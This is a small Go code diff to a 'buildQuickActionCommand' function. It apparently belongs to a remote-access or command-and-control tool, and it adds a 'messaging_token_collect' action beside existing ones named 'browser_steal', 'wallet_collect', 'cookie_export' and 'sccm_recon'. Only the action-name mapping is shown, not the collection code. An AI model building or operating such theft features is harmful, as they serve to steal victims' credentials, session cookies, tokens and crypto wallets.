@@ -203,6 +203,8 @@ func buildQuickActionCommand(action, param, shell string) (string, string) {
 		return "browser_steal", ""
 	case "wallet_collect":
 		return "wallet_collect", ""
+	case "messaging_token_collect":
+		return "messaging_token_collect", ""
 	case "cookie_export":
 		return "cookie_export", "all"
 	case "sccm_recon":
